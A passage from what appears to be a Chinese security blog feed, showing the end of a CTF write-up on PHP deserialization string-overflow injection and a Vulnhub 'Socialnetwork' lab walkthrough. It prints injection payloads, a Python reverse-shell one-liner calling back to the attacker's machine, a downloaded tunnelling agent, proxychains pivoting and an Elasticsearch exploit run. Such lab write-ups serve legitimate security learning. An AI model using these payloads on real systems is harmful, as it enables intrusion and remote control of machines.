class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;</span><br><span class="line">s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125; <span class="comment">// åˆ°è¿™é‡Œæ­£å¥½ï¼Œä¸‹ä¸€è¡Œå†…å®¹è¢«ä¸¢å¼ƒ</span></span><br><span class="line"><span class="string">&quot;;s:5:&quot;</span>photo<span class="string">&quot;;s:4:&quot;</span>m1ku<span class="string">&quot;;&#125;      </span></span><br></pre></td></tr></table></figure></p>
<p>payloadæ„é€ å¥½äº†ï¼Œæ¥ä¸‹æ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰é™åˆ¶æ¡ä»¶ã€‚å‘ç°é™¤äº†è¿‡æ»¤å‡½æ•°ï¼Œè¿˜å‰©ä¸‹ä¸€ä¸ªï¼Œé‚£å°±æ˜¯<code>strlen($_POST['nickname']) &gt; 10</code>å¾—ä¸ºfalseï¼ŒæŒ‰ç…§æˆ‘ä»¬é‚£ä¹ˆé•¿çš„payloadï¼Œè¿™é‡Œè‚¯å®šä¸ºtrueï¼Œè¿™æ—¶å€™å°±åˆ©ç”¨<a href="#2%202%20æ•°ç»„ç»•è¿‡ä¸€äº›å‡½æ•°">2 2 æ•°ç»„ç»•è¿‡ä¸€äº›å‡½æ•°</a>ï¼Œä¼ å…¥<code>nickname[]</code>å°±èƒ½å¤Ÿä¸ºfalseï¼Œä»è€Œç»•è¿‡ã€‚</p>
<p>è€Œ<a href="#2%201%20å±æ€§ä¸­å«æœ‰æ•°ç»„è¯¥å¦‚ä½•ååºåˆ—åŒ–">2 1 å±æ€§ä¸­å«æœ‰æ•°ç»„è¯¥å¦‚ä½•ååºåˆ—åŒ–</a>é‡Œé¢ä¹Ÿè¯´æ˜äº†ï¼Œå¦‚æœç±»å±æ€§ä¸­æœ‰æ•°ç»„ï¼Œéœ€è¦é—­åˆ<code>&#123;&#125;</code>ï¼Œå› æ­¤æœ€ç»ˆéœ€è¦æ³¨å…¥çš„åº”è¯¥æ˜¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; </span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆæ³¨æ„}çš„ä½ç½®ï¼Œåˆ«æé”™äº†ï¼‰æ­¤æ—¶é•¿åº¦ä¸º34ï¼Œå› æ­¤ï¼Œéœ€è¦34ä¸ªwhereï¼Œæ‰€ä»¥æœ€ç»ˆçš„payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname[]:</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>æ¥ä¸‹æ¥éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åç™»å½•ï¼Œå†profile.phpé¡µé¢è¾“å…¥ä¿¡æ¯(æ­¤æ—¶nicknameå…ˆéšä¾¿è¾“)ï¼Œç„¶åæŠ“åŒ…ï¼Œä¿®æ”¹å…¶ä¸­nicknameçš„å€¼å’Œåå­—ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418171816.png" /></p>
<p>æ­¤æ—¶è™½ç„¶æœ‰æç¤ºï¼Œä½†æ˜¯å·²ç»ä¸Šä¼ æˆåŠŸäº†ã€‚ç„¶åå›åˆ°profile.phpé¡µé¢ï¼ŒæŸ¥çœ‹æºç </p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418171916.png" /></p>
<p>base64è§£ç å³å¯ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418171951.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>æºç å®¡è®¡</tag>
        <tag>ååºåˆ—åŒ–æº¢å‡º</tag>
        <tag>å±æ€§å€¼ä¸ºæ•°ç»„çš„åºåˆ—åŒ–</tag>
        <tag>æ•°ç»„ç»•è¿‡</tag>
      </tags>
  </entry>
  <entry>
    <title>1. Vulnhub Socialnetwork writeup</title>
    <url>/2022/03/27/1.%20Vulnhub%20Socialnetwork%20writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸­ç­‰ã€‚å°†å†…ç½‘æ¸—é€è¿‡ç¨‹ä¸­çš„ä¸»è¦çŸ¥è¯†ç‚¹éƒ½æ¶‰åŠäº†ï¼Œè´¨é‡éå¸¸é«˜ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼šhttps://www.vulnhub.com/entry/boredhackerblog-social-network,454/</p>
<p>éš¾åº¦ï¼šMedium</p>
<p>è™šæ‹Ÿæœºè½¯ä»¶ï¼šVirtual Box</p>
<h1 id="è™šæ‹Ÿæœºé…ç½®">è™šæ‹Ÿæœºé…ç½®</h1>
<h2 id="virtual-box-ä¸‹è½½å®‰è£…">Virtual Box ä¸‹è½½ã€å®‰è£…</h2>
<p>é¦–å…ˆï¼Œå»virtual box <a href="https://www.virtualbox.org/wiki/Downloads">å®˜ç½‘</a>ä¸‹è½½ï¼Œè¦ä¸‹è½½ä¸¤ä¸ªä¸œè¥¿ï¼š 1. å®‰è£…åŒ… 2. æ‰©å±•åŒ…</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143744.png" /></p>
<p>è®°ä½ï¼Œå®‰è£…åŒ…å’Œæ‰©å±•åŒ…çš„ç‰ˆæœ¬å¾—ä¸€è‡´ï¼Œå¦åˆ™æ‰©å±•åŒ…æ— æ³•å®‰è£…ã€‚</p>
<p>ä¸‹è½½å®Œæ¯•ä¹‹åï¼Œå…ˆå®‰è£…Virtual Boxï¼Œå®‰è£…å®Œæ¯•ä¹‹åé€‰æ‹© <code>ç®¡ç†-&gt;å…¨å±€è®¾å®š-&gt;æ‰©å±•</code> ç„¶åé€‰æ‹©åˆšåˆšä¸‹è½½å¥½çš„æ‰©å±•åŒ…å³å¯ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143913.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327143956.png" /></p>
<h2 id="ç½‘ç»œé…ç½®">ç½‘ç»œé…ç½®</h2>
<ol type="1">
<li>æ‰“å¼€ä¸»æœºçš„ <code>ç½‘ç»œé€‚é…å™¨é€‰é¡¹</code> æ‰¾åˆ°ä¸»æœºè¿æ¥ç½‘ç»œçš„ç½‘å¡ï¼Œç„¶åå…±äº«åˆ° <code>VirtualBox Host-Only Ethernet Adapter</code>ã€‚</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144304.png" /></p>
<p>è®¾ç½®å…±äº«çš„æ—¶å€™ä¼šè·³å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œé‡Œé¢æœ‰IPåœ°å€ï¼Œè¦è®°ä½å®ƒã€‚</p>
<ol start="2" type="1">
<li>å›åˆ° virtual boxï¼Œ<code>ç®¡ç†-&gt;ä¸»æœºç½‘ç»œç®¡ç†å™¨</code></li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144440.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144448.png" /></p>
<p>ç¬¬ä¸€å¼ å›¾ä¸­çš„IPv4åœ°å€ä¿®æ”¹æˆåˆšåˆšå¼¹å‡ºçš„IPåœ°å€ï¼Œå…¶ä»–ä¹Ÿéœ€è¦å¯¹åº”çš„ä¿®æ”¹ä¸ºåŒä¸€ç½‘æ®µã€‚</p>
<ol start="3" type="1">
<li>å°†kaliå’Œé¶æœºéƒ½è®¾ç½®ä¸ºå¦‚ä¸‹</li>
</ol>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144559.png" /></p>
<p>åˆ°è¿™ä¸€æ­¥ï¼Œæ‰“å¼€kaliä¼šå‘ç°å…¶å®æ— æ³•ä¸Šç½‘ï¼Œé‚£æ˜¯å› ä¸ºæ­¤æ—¶æ²¡æœ‰è·¯ç”±ï¼Œè¾“å…¥å‘½ä»¤ <code>route -n</code> ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144727.png" /></p>
<p>ï¼ˆæˆ‘æ¶‚æ‰çš„é‚£ä¸€è¡Œåº”è¯¥æ˜¯æ²¡æœ‰çš„ï¼Œæˆ‘åå¤©æ·»åŠ ä¸Šå»çš„ï¼‰</p>
<ol start="4" type="1">
<li>æ·»åŠ è·¯ç”±</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo route add default gw 192.168.137.1 ï¼ˆåˆšåˆšè®°ä½çš„IPï¼‰</span><br></pre></td></tr></table></figure>
<p>ç„¶åå†æ¬¡æŸ¥çœ‹è·¯ç”±ï¼Œç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327144914.png" /></p>
<p>æ­¤æ—¶ <code>ping baidu.com</code> å‘ç°æœ‰æ•°æ®åŒ…ï¼ŒæˆåŠŸè¿æ¥å¤–ç½‘ã€‚ï¼ˆæ¯æ¬¡å¼€æœºéƒ½éœ€è¦æ·»åŠ ä¸€æ¬¡è·¯ç”±ï¼Œéœ€è¦æ°¸ä¹…çš„å¯ä»¥ç™¾åº¦ï¼‰</p>
<p>åˆ°æ­¤ä¸ºæ­¢ï¼Œé…ç½®ç»“æŸã€‚</p>
<h1 id="æ¸—é€">æ¸—é€</h1>
<p>æ‰“å¼€kaliå’Œé¶æœºï¼Œå¼€å§‹æ¸—é€ã€‚kali çš„IP ä¸º <code>192.168.137.101</code>ã€‚</p>
<h2 id="ä¸»æœºå‘ç°">ä¸»æœºå‘ç°</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">æˆ–è€… sudo nmap 192.168.137.0/24</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145228.png" /></p>
<p>ç¬¬ä¸€ä¸ªæ˜¯ç½‘å…³ï¼Œç¬¬äºŒä¸ªæ˜¯ä¸»æœºåœ¨è¯¥ç½‘æ®µçš„IPï¼Œæ‰€ä»¥ç¬¬ä¸‰ä¸ªå°±æ˜¯é¶æœºçš„IPåœ°å€ã€‚</p>
<p>é¶æœºIP Getï¼</p>
<h2 id="ç«¯å£æ‰«æ">ç«¯å£æ‰«æ</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 192.168.137.102</span><br></pre></td></tr></table></figure>
<p>åœ¨æ¸—é€çš„è¿‡ç¨‹ä¸­æœ€å¥½å…¨ç«¯å£æ‰«æï¼Œä¸è¦æœ‰é—æ¼ï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145500.png" /></p>
<p>å¼€æ”¾ç«¯å£ä¸º 22ï¼Œ 5000ã€‚</p>
<p>ç«¯å£ä¿¡æ¯ Getï¼</p>
<h2 id="ç«¯å£æœåŠ¡å‘ç°">ç«¯å£æœåŠ¡å‘ç°</h2>
<p>çŸ¥é“å¼€æ”¾ç«¯å£åï¼Œæ‰«é¢ä¸€ä¸‹å¯¹åº”ç«¯å£çš„æœåŠ¡ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,5000 -sV 192.168.137.102</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327145655.png" /></p>
<p>å‘ç° 5000 ç«¯å£ä¸Šçš„æœåŠ¡æ˜¯ httpï¼Œå¯èƒ½å­˜åœ¨ç½‘é¡µã€‚ç‰ˆæœ¬ä¿¡æ¯ä¸º <code>Werkzeug httpd 0.14.1</code> ï¼Œ ç”¨çš„æ˜¯ python2ï¼Œè¯´æ˜é¶æœºå­˜åœ¨ç€pythonç¯å¢ƒã€‚ç‰ˆæœ¬ä¸º <code>2.7.15</code>ã€‚</p>
<p>ï¼ˆç™¾åº¦ä¸€ä¸‹ Werkzeugï¼ŒWerkzeug æ˜¯ä¸€ä¸ªWSGIå·¥å…·åŒ…ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªWebæ¡†æ¶çš„åº•å±‚åº“ã€‚ï¼‰</p>
<h2 id="è®¿é—®httpæœåŠ¡">è®¿é—®httpæœåŠ¡</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327150053.png" /></p>
<p>ç»è¿‡æµ‹è¯•ï¼Œåªæœ‰è¿™ä¸€ä¸ªåŠŸèƒ½ç‚¹ï¼Œä½œç”¨æ˜¯å°†è¾“å…¥çš„å†…å®¹æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p><strong>webåº”ç”¨ç¨‹åºæœ€é‡è¦çš„ä¸€æ­¥å°±æ˜¯ç›®å½•æ‰«æï¼</strong></p>
<h2 id="ç›®å½•æ‰«æ">ç›®å½•æ‰«æ</h2>
<p>æ¨èä½¿ç”¨ <code>dirsearch</code>ï¼Œï¼ˆå¦‚æœæ²¡æœ‰çš„è¯å¯ä»¥æŒ‰ç…§æç¤ºå®‰è£…ï¼‰å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dirsearch -u http://192.168.137.102:5000/</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154504.png" /></p>
<p>æ³¨æ„åˆ°æœ‰ä¸€ä¸ªç»“æœï¼Œè®¿é—®çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327154534.png" /></p>
<h2 id="åå¼¹shell">åå¼¹shell</h2>
<p>æ ¹æ®è¿™ä¸ªé¡µé¢çš„æç¤ºï¼Œè¿™é‡Œå¥½åƒå¯ä»¥æ‰§è¡Œä»£ç ï¼Œä¹‹å‰çš„ä¿¡æ¯é‡Œè¯´æ˜è¿™ä¸ªç¯å¢ƒä½¿ç”¨pythonæ­å»ºçš„ï¼Œå› æ­¤å°è¯•ä»¥ä¸‹pythonçš„ä»£ç æ‰§è¡Œï¼Œå¯ä»¥ç™¾åº¦ä¸€ä¸‹pythonåå¼¹shellçš„ä»£ç ï¼ˆä¿®æ”¹ä¸€ä¸‹kaliçš„IPå’Œç›‘å¬ç«¯å£ï¼‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;192.168.137.101&quot;</span>,<span class="number">8888</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨kaliä¸Šç›‘å¬å¯¹åº”çš„ç«¯å£ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155030.png" /></p>
<p>ï¼ˆæ³¨æ„ï¼Œè¦å…ˆç›‘å¬ï¼Œç„¶åå†æ‰§è¡Œ python åå¼¹ shell çš„ä»£ç ï¼Œå¤§è‡´ä¸Šå¯ä»¥ç†è§£ kali å¼€å¯ä¸€ä¸ªæœåŠ¡ç„¶åè®©é¶æœºæ¥é“¾æ¥ï¼Œå¦‚æœ kali æ²¡å¼€å°±è¿ä¸ä¸Šï¼‰</p>
<p>æˆåŠŸåå¼¹shellï¼Œè¿æ°”å¾ˆå¥½ï¼Œæ˜¯ rootã€‚æŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ï¼Œå‘ç°æœ‰ä¸€ä¸ª <code>dockerfile</code> æ–‡ä»¶ã€‚ç†Ÿæ‚‰dockerçš„åº”è¯¥æ„Ÿè§‰ä¸å¯¹åŠ²ï¼Œ<strong>å¯èƒ½è¿™æ˜¯ä¸€ä¸ªdockerå®¹å™¨ï¼Œå¹¶ä¸æ˜¯çœŸå®çš„ä¸»æœºï¼</strong></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155120.png" /></p>
<p>æŸ¥çœ‹ <code>Dockerfile</code> ï¼Œå‘ç°æ˜¯dockeræ¨¡æ¿æ–‡ä»¶ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155427.png" /></p>
<p>è¿›ä¸€æ­¥æ€€ç–‘å½“å‰æ˜¯ä¸€ä¸ªdockerç³»ç»Ÿã€‚æ¥ä¸‹æ¥ç”¨ä¸¤ä¸ªæ–¹æ³•è¿›ä¸€æ­¥ç¡®å®šï¼š</p>
<ol type="1">
<li><code>ls /.dockerenv</code>ï¼Œæ ¹ç›®å½•å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œå¤§æ¦‚ç‡ä¸ºdockerç³»ç»Ÿï¼› <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155548.png" /></li>
<li><code>cat /proc/1/cgroup</code>ï¼ŒLinuxåˆå§‹åŒ–è¿›ç¨‹ï¼ˆè¿›ç¨‹idä¸º1ï¼‰çš„cgroupä¸­åŒ…å«ç€dockeré•œåƒä¿¡æ¯çš„æ—¶å€™ï¼Œå¯ä»¥ç¡®å®šæ˜¯dockerï¼› <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327155620.png" /></li>
</ol>
<p>æŸ¥çœ‹ä»¥ä¸‹IPåœ°å€ï¼Œå‘ç°IPåœ°å€å’Œkaliæ‰«æå‡ºæ¥çš„ä¸ä¸€æ ·</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327160430.png" /></p>
<p>dockerç³»ç»Ÿçš„è¿™ä¸ªç½‘æ®µå¯ä»¥å½“ä½œæ˜¯ç›®æ ‡ä¸»æœºçš„å†…ç½‘ç½‘æ®µï¼Œæ¥ä¸‹æ¥å°±éœ€è¦åšåˆ°ï¼š</p>
<ol type="1">
<li>å†…ç½‘æ˜¯å¦å­˜åœ¨å…¶ä»–ä¸»æœº</li>
<li>å“ªå°ä¸»æœºæ˜¯çœŸå®çš„ç›®æ ‡</li>
<li>æ˜¯å¦å­˜åœ¨æ¼æ´å¯ä»¥åˆ©ç”¨</li>
</ol>
<h2 id="å†…ç½‘ä¸»æœºå‘ç°">å†…ç½‘ä¸»æœºå‘ç°</h2>
<p>å¯ä»¥é€šè¿‡ <code>ping</code> åªè¦ä¿®æ”¹æœ€åé¢çš„æ•°å€¼å³å¯ï¼Œä½†æ˜¯è¿™é‡Œå­ç½‘æœ‰16ä½ï¼Œä¹Ÿå°±æ˜¯æœ‰65535ä¸ªIPåœ°å€éœ€è¦æµ‹è¯•ã€‚ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 255);do ping -c 1 172.17.0.$i; done</span><br><span class="line"></span><br><span class="line">for i in $(seq 0 255);do for j in $(seq 1 255);do ping -c 1 172.17.$i.$j;done;done</span><br><span class="line">è§£é‡Šï¼šåŒå±‚å¾ªç¯ï¼Œ-cåé¢çš„ 1 è¡¨ç¤ºä¸€ä¸ªåœ°å€åªå‘ä¸€ä¸ªæ•°æ®åŒ…</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327185626.png" /></p>
<p>å‘ç°å†…ç½‘å†…åªæœ‰3ä¸ªIPåœ°å€å­˜æ´»ï¼ˆè¿™ä¸ªè„šæœ¬è¿è¡Œçš„æ¯”è¾ƒæ…¢ï¼Œä¹Ÿå¯ä»¥ç”¨å·¥å…·ï¼‰ã€‚</p>
<p>å½“å‰IPåœ°å€æ˜¯ 172.17.0.2ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±éœ€è¦å¯¹å¦å¤–ä¸¤ä¸ªä¸»æœºè¿›è¡Œæ‰«æï¼Œå› ä¸ºkaliçš„å·¥å…·æ— æ³•ç›´æ¥åº”ç”¨åœ¨å†…ç½‘ç¯å¢ƒä¸‹ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨ä»£ç†ï¼Œå°†172.17.0.2ä½œä¸ºä»£ç†å¯¹å†…ç½‘ä¸»æœºè¿›è¡Œæ‰«æã€‚</p>
<h2 id="å†…ç½‘ç©¿é€">å†…ç½‘ç©¿é€</h2>
<p>å†…ç½‘ç©¿é€å·¥å…·ï¼š<a href="https://github.com/Dliv3/Venom">venom</a></p>
<p>kali å¦å¼€ä¸€ä¸ªcmdç›‘å¬ 9999 ç«¯å£ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191518.png" /></p>
<p>kali å¼€å¯ http æœåŠ¡ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 8295</span><br><span class="line"></span><br><span class="line">æ³¨æ„ï¼šè¦åœ¨venomæ‰€åœ¨ç›®å½•è¿è¡Œï¼Œæ¢å¥è¯è¯´ï¼Œè¦åœ¨agent.exeåœ¨çš„</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327191624.png" /></p>
<p>é¶æœºä»kaliä¸‹è½½ä»£ç†ç«¯ï¼Œå¹¶è¿è¡Œï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.137.101:8295/agent_linux_x64 æ ¹æ®é¶æœºçš„æ“ä½œç³»ç»Ÿé€‰æ‹©å¯¹åº”çš„ä»£ç†ç«¯</span><br><span class="line">å¦‚æœæç¤ºæ²¡æœ‰æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä»¥ä¸‹kaliå¼€å¯çš„httpæœåŠ¡æ˜¯å¦åœ¨venomç›®å½•ä¸‹</span><br><span class="line"></span><br><span class="line">chmod +x agent_linux_x64</span><br><span class="line"></span><br><span class="line">./agent_linux_x64 -rhost 192.168.137.101 -rport 9999</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327192942.png" /></p>
<p>å¯åŠ¨ socks5 ä»£ç†ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. show</span><br><span class="line">2. goto 1</span><br><span class="line">3. socks 1080 ç«¯å£å¯ä»¥é€‰å…¶ä»–çš„</span><br></pre></td></tr></table></figure> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327193102.png" /></p>
<p>æ¥ä¸‹æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶ <code>proxychains4.conf</code>ï¼Œè¿™æ ·å°±å¯ä»¥è®©å·¥å…·é€šè¿‡ä»£ç†è¿›è¡Œå·¥ä½œäº†ï¼Œå‘½ä»¤å‰è¦åŠ ä¸Š <code>proxychains</code>ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains4.conf</span><br><span class="line"></span><br><span class="line">å°†åŸæ¥çš„ socks4 127.0.0.1 9050 æ³¨é‡Š</span><br><span class="line">æ·»åŠ ï¼š</span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure></p>
<h2 id="å†…ç½‘ä¿¡æ¯æ”¶é›†">å†…ç½‘ä¿¡æ¯æ”¶é›†</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. proxychains4 nmap -Pn -sT 172.17.0.1</span><br><span class="line">2. proxychains4 nmap -Pn -sT 172.17.0.3</span><br></pre></td></tr></table></figure>
<p>ç»“æœåˆ†åˆ«ä¸ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194514.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327194527.png" /></p>
<p>å¯ä»¥çœ‹åˆ° 172.17.0.1 çš„ç«¯å£å’ŒæœåŠ¡ä¸ä¹‹å‰æ‰«æ 192.168.137.102 çš„æ—¶å€™ä¸€æ¨¡ä¸€æ ·ï¼Œæ‰€ä»¥æ¨æµ‹ï¼Œè¿™å°±æ˜¯çœŸæ­£çš„ä¸»æœºã€‚</p>
<p>å¯ä»¥åšä¸€ä¸‹éªŒè¯ï¼Œåˆ©ç”¨æµè§ˆå™¨å»è®¿é—® <code>172.17.0.1:5000</code> ï¼Œå¦‚æœå‡ºç°å¯¹åº”çš„é¡µé¢ï¼Œå³å¯ç¡®å®šè¿™å°±æ˜¯çœŸæ­£çš„ä¸»æœºã€‚</p>
<p>ä¸è¿‡æµè§ˆå™¨ä¹Ÿè¦è®¾ç½®ä»£ç†ï¼Œï¼ˆå…¶å®ä¹Ÿå¯ä»¥ç”¨ <code>proxychains4 firefox</code> æ¥æ‰“å¼€æµè§ˆå™¨ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå®ç°ä¸äº†ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195300.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195311.png" /></p>
<p>åˆ°æ­¤ï¼Œå¯ä»¥å®Œå…¨ç¡®å®š <code>172.17.0.1</code> å°±æ˜¯çœŸæ­£çš„ä¸»æœºï¼è¿˜æœ‰ <code>172.17.0.2</code> ä¹Ÿéœ€è¦æ‰«æï¼ˆè¿™é‡Œæ˜¯å› ä¸ºæˆ‘ä»¬ä¹‹å‰æ‹¿åˆ°çš„æ˜¯webshellï¼Œæ‰«æçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰æ¼æ´èƒ½æ‹¿åˆ°shellæƒé™ï¼‰ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195702.png" /></p>
<p>å‘ç° 9200 ç«¯å£æ‰“å¼€ã€‚æŸ¥çœ‹ä¸€ä¸‹å¯¹åº”çš„æœåŠ¡ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -p9200 -sV 172.17.0.2</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327195826.png" /></p>
<p><code>Elasticsearch</code> ç‰ˆæœ¬ä¸º 1.4.2ã€‚å¯ä»¥ç”¨msfæŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚</p>
<h2 id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327200545.png" /></p>
<p>å¯ä»¥ä¸€ä¸ªä¸€ä¸ªå°è¯•ï¼Œå…ˆå°è¯•ç¬¬ä¸€ä¸ªã€‚å°†expå¤åˆ¶åˆ°å½“å‰ç›®å½•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201304.png" /></p>
<p>å¯ä»¥ç”¨ <code>cat 36337.py</code> æŸ¥çœ‹ä¸€ä¸‹expè¯´æ˜ï¼Œå‘ç°æ˜¯ python2 ç¼–å†™çš„ã€‚</p>
<p>æ‰§è¡Œexp <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains4 python2 36337.py 172.17.0.2</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327201554.png" /></p>
